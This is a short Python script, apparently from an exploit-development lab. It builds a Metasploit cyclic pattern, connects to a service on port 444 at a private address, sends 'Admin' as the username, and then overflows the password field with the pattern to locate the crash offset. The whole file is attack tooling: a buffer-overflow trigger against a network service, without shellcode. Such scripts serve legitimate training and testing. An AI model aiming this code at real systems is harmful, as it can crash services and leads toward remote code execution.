#!/usr/bin/python
import sys, socket, time, os, traceback


targetIP="10.10.0.1"

try:
  print "\nSending evil buffer..."

  # create pattern using msf-pattern_create
  size = 1200 
  myCMD = "msf-pattern_create -l {0}"
  stream = os.popen(myCMD.format(str(size)))
  myPattern = stream.read()
  myPattern = myPattern.strip()

  buffer = myPattern

  print("Sending msf pattern ")
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

  s.connect((targetIP, 444))
  banner = s.recv(1024)
  print(banner)

  s.send("Admin")
  banner=s.recv(1024)
  print(banner)
 
  # send the bof on the pass
  s.send(buffer)
 

except Exception as e:
    print "\nCould not connect!"
    print(e)
    print(traceback.format_exc())
    sys.exit()
